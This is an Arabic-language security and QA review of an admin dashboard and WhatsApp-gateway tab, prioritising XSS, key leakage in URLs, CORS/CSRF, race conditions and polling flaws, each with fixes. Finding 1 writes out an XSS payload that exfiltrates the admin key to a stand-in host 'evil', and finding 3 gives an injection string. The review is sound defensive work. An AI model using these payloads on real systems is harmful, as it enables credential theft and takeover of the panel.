# مراجعة QA — admin.ts + whatsapp-tab.ts

نطاق: ما عندي الراوتر اللي يفحص `?key=`، ولا `gateway.mjs`، ولا إعداد nginx — فالملاحظات المتعلقة بـ CORS والتحقق الفعلي من المفتاح مبنية على سلوك الكود المعطى، وأشّرت على الافتراضات.

## P0

1) XSS مخزّن من ردّ البوابة → سرقة ADMIN_KEY
- الموقع: `whatsapp-tab.ts` — `qrSection`: `<img src="${state.qr}">`، و`${state.user}` و`${state.lastError}` في `.wa-status`، و`${state.pairingCode}`.
- الوصف: قيم قادمة من JSON البوابة تُدرج بلا escaping ولا تحقق نوع. قيمة مثل `x" onerror="fetch('https://evil/?k='+location.search)` تكسر الـ attribute. حقلا `lastError`/`user` هما الأخطر لأنهما يحملان نصوصاً من واتساب (pushName، أخطاء Baileys، نصوص رسائل السواقين).
- الأثر: المفتاح موجود داخل `location.search`، فأي XSS = تسريب ADMIN_KEY = تحكم كامل بالبوابة (`/logout`، `/pair`، `/outbox`) وبكل CRUD الإداري.
- الإصلاح: `const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))` على كل تعبير، مع `state.qr.startsWith('data:image/')` و`/^\d{4,12}$/.test(state.pairingCode)`.

2) XSS من بيانات D1
- الموقع: `admin.ts` — `${d.name}`, `${d.car}`, `${d.plate}`, `${z.name}` (بالجدول وبـ `<option>` معاً), `${f.note}`, `${r.client_phone}`, و`class="st ${r.status}"`.
- الأثر: نفس سلسلة الاستغلال أعلاه، ومصدرها أي حقل يُكتب من الواجهة أو من مسار الواتساب.
- الإصلاح: نفس `esc()` على كل قيمة مُدرجة في HTML (وفصلها عن سياق الـ attribute).

3) JS injection عبر `driver.status` (بلا whitelist)
- الموقع: `admin.ts` — `case 'driver.status'`: `String(body.status)` بلا تحقق؛ ثم يُعاد عرضه داخل سترينغ JS داخل attribute: `onclick="driverStatus(${d.id},'${d.status===...}')"`.
- الأثر: تخزين `'),alert(1)//` ينفّذ JS عند كل من يفتح اللوحة (تخزين دائم في D1).
- الإصلاح: `if(!['AVAILABLE','BUSY','OFFLINE'].includes(body.status)) return Response.json({error:'status'},{status:400});`

4) المفتاح في الـ querystring وعبر النطاقات
- الموقع: `whatsapp-tab.ts` — `'/pair/qr?token='+TOKEN`, `/pair/code?token=`, `/logout?token=`؛ و`admin.ts` — `API+action+'?key='+K`.
- الوصف: نفس `env.ADMIN_KEY` يُستخدم كتوكن للبوابة، أي سِر واحد لنطاقَي ثقة، ويُرسل بالرابط.
- الأثر: ترسّب دائم في سجلات nginx access على الـ VPS، وسجلات Cloudflare، وhistory/bookmarks المتصفح، وأي مشاركة شاشة أو رابط منسوخ. توكن ثابت بلا انتهاء = وصول دائم.
- الإصلاح: انقله للهيدر (`headers:{'x-gateway-token':TOKEN}`) واقرأه من cookie `HttpOnly; Secure; SameSite=Strict` تُضبط مرة عبر POST تسجيل دخول — والأفضل: مرّر نداءات البوابة عبر الـ Worker (`/admin/api/wa/*`) فما يشوف المتصفح توكن البوابة أصلاً.

5) Race بين نداءات pair المتزامنة
- الموقع: `whatsapp-tab.ts` — `pairQR()` / `pairCode()`: بلا تعطيل أزرار، بلا single-flight، وبلا فحص `r.ok`.
- الأثر: دبل-كليك، أو QR ثم كود، = سوكيتان Baileys على نفس مجلد الـ auth → تلف الجلسة و`401` وفقدان الربط، أي توقف كامل للخدمة.
- الإصلاح: `let busy=false;` + `btn.disabled=true` بالواجهة، و`409` من البوابة إذا الحالة `initializing|connecting`.

## P1

6) QR قديم بعد POST /pair (الـ race المطلوب)
- الموقع: `whatsapp-tab.ts` — `pairQR()` يصفّر `lastQr=null` ولا يستدعي `pollStatus()` فوراً؛ وشرط `s.qr !== lastQr` في `pollStatus`.
- الوصف: أول poll يوصل بعد 4 ثوان والبوابة لسا `initializing`، فترجّع QR الجلسة السابقة؛ ولأن `lastQr` صار `null` يُعتبر «جديد» ويُعرض.
- الأثر: المشغّل يمسح QR منتهياً ويفشل بلا أي رسالة، ويعيد المحاولة → بند 5.
- الإصلاح: البوابة ترجّع `qrEpoch`/`generatedAt` تصاعدياً، والواجهة تتجاهل `epoch <= epochAtPairClick` وتنادي `await pollStatus()` مباشرة بعد الـ POST.

7) حلقة reload تُعطّل اللوحة
- الموقع: `whatsapp-tab.ts` — `if(!img) location.reload()`، و`if(!s.qr && lastQr) location.reload()`، و`pairingCode!==lastCode → location.reload()`.
- الأثر: أي تذبذب في حالة `qr` = reload كل 4 ثوان → لا يمكن الضغط على شيء، ويُمحى الرقم المكتوب في `#pairPhone` فلا ينجح الاقتران بالرقم أبداً؛ وكل reload = 4 استعلامات D1 + fetch بمهلة 4s.
- الإصلاح: حدّث DOM موضعياً (أنشئ/أزل `.qr-box` بالجافاسكربت) وامنع أي `location.reload()` من مسار الـ polling.

8) Polling بلا ضوابط
- الموقع: `whatsapp-tab.ts` — `setInterval(pollStatus,4000)`؛ و`refreshLoop()` منادى مرتين (يخفيها `clearInterval` بالحظ).
- الأثر: ~21.6k طلب/يوم لكل تبويب مفتوح على عملية Node واحدة؛ بلا backoff ولا `document.hidden` ولا AbortController → طلبات متراكبة عند البطء؛ و`catch{}` يبلع الأخطاء فتبقى الشارة «متصل» والاتصال مقطوع.
- الإصلاح: `if(document.hidden) return;` + backoff 4s→30s عند الفشل + `AbortSignal.timeout(3000)` + شارة «تعذّر الوصول للبوابة» بعد فشلين.

9) CORS/Origin مفتوح فعلياً
- الموقع: كل نداءات `GW+...` من المتصفح إلى `almaih.cloud/g`.
- الوصف: لنجاح هذه النداءات لازم البوابة ترجّع `Access-Control-Allow-Origin` (يُرجّح `*`). و`POST /pair/qr?token=` و`POST /logout?token=` بلا هيدرز = simple request → بلا preflight → يُنفّذان عند البوابة حتى لو حجب المتصفح قراءة الرد.
- الأثر: أي صفحة على الإنترنت تقدر تقطع الجلسة أو تبدأ اقتراناً إذا التوكن انكشف (وهو منكشف بالسجلات) — CSRF كامل على البوابة.
- الإصلاح: `Access-Control-Allow-Origin: https://<admin-origin>` بالضبط + `Vary: Origin` + رفض أي `Origin` غير مطابق + قبول التوكن من الهيدر فقط (يفرض preflight على كل مسار).

10) لا تحقق مصادقة داخل `adminApi`
- الموقع: `admin.ts` — `adminApi(request, env, action)` لا تفحص المفتاح، و`adminPage(env)` لا تستلم `request` أصلاً.
- الأثر: إذا الراوتر لم يفحص `?key=` قبل النداء فكل الـ CRUD مكشوف للعالم (يصير P0). حتى مع فحص الراوتر، لا يوجد دفاع طبقي.
- الإصلاح: افحص المفتاح داخل الدالة بمقارنة زمن-ثابت وارجع 401 قبل `request.json()`.

11) رؤوس أمان مفقودة على رد الصفحة
- الموقع: `admin.ts` — `new Response(html,{headers:{'content-type':...}})`.
- الأثر: صفحة تحمل المفتاح بالرابط قابلة للتخزين والـ framing، ولا CSP يخفّف بنود 1–3.
- الإصلاح: أضف `'cache-control':'no-store'`, `'referrer-policy':'no-referrer'`, `'x-frame-options':'DENY'`, `'content-security-policy':"default-src 'self'; img-src 'self' data:; frame-ancestors 'none'"` (يقتضي نقل الـ inline handlers).

12) تشخيص مضلّل لأعطال البوابة
- الموقع: `admin.ts` — `gatewayStatus`: `if(!res.ok) return null` + `catch{return null}` → 401 و502 والمهلة كلها تظهر «البوابة غير متاحة — شغّل gateway.mjs».
- الأثر: المشغّل يعيد تشغيل خدمة سليمة بينما المشكلة توكن خاطئ؛ وكل تحميل صفحة يُحجب حتى 4 ثوان على المسار الحرج.
- الإصلاح: أرجع `{status:res.status}` وافرز الرسالة (401 → «توكن البوابة غلط»)، وخفّض المهلة إلى 1500ms أو اجلب حالة التبويب بعد التحميل.

13) `logout()` لا ينتظر تأكيد القطع
- الموقع: `whatsapp-tab.ts` — `await fetch(GW+'/logout...'); location.reload();`
- الأثر: الـ reload يرندر حالة `connected` قديمة فيضغط المشغّل مرة ثانية.
- الإصلاح: استقصِ `/status` حتى `closed` (3 محاولات) قبل الـ reload.

14) `/outbox/fail` غير مستخدم في الواجهة
- الأثر: رسائل السواقين/الزبائن الفاشلة تسقط بصمت بلا أي رؤية.
- الإصلاح: أضف قسم «رسائل فاشلة» يجلب `/outbox/fail` مع زر إعادة إرسال — مع escaping إلزامي لنص الرسالة.

## P2

- `zone.del`: `DELETE FROM zones` قاسي مع مراجع `rides.from_zone_id` → رحلات تاريخية تفقد أسماءها. الإصلاح: `UPDATE zones SET active=0`.
- `fare.add`: لا قيد فريد على `(from_zone_id,to_zone_id)` → تعاريف متضاربة و«اليدوي يفوق» يصير عشوائياً. الإصلاح: unique index + UPSERT.
- `editFare`: `+p` من `prompt` يمرّر NaN/سالب → 500. الإصلاح: `if(!Number.isFinite(price)||price<0) return 400`.
- `driver.add`: `phone` و`commission_pct` محدودان بالـ HTML فقط. الإصلاح: `/^\d{8,15}$/` وclamp 0–50 بالسيرفر.
- كل عملية CRUD تنهي بـ `location.reload()` (4 استعلامات D1 + fetch بوابة) — حدّث الصف بدلاً منها.
- `GATEWAY_URL` وخريطة الشارات مكررتان (سيرفر/كلينت) → انحراف؛ و`const TOKEN/GW` بالنطاق العام تُسقط كل السكربت بـ SyntaxError لو رُندر التبويب مرتين.
- إمكانية الوصول: `<tr>` بلا `<thead>`/`scope="col"`، الشارة بلا `aria-live="polite"` فقارئ الشاشة لا يعلم بانقطاع الاتصال، `alt="QR"` غير وصفي، أزرار الأيقونات بلا `aria-label`، و`pairingExpiresInSec` ثابت لا يتنازل.
- `K=...get('key')` عند غياب المفتاح يرسل `?key=null` وسلسلة alerts غامضة — اعرض شاشة «مفتاح مفقود».

## نقاط قوة
- كل استعلامات D1 مُعاملة عبر `prepare/bind` بلا أي بناء SQL نصي، مع تحويلات `String()/Number()` متسقة على الـ body.
- `ride.cancel` يتحقق من الحالة على السيرفر لا بالواجهة فقط، والحذف المنطقي للسواقين (`active=0`) يحفظ التاريخ — وواجهة RTL نظيفة بلا أي framework أو تبعيات.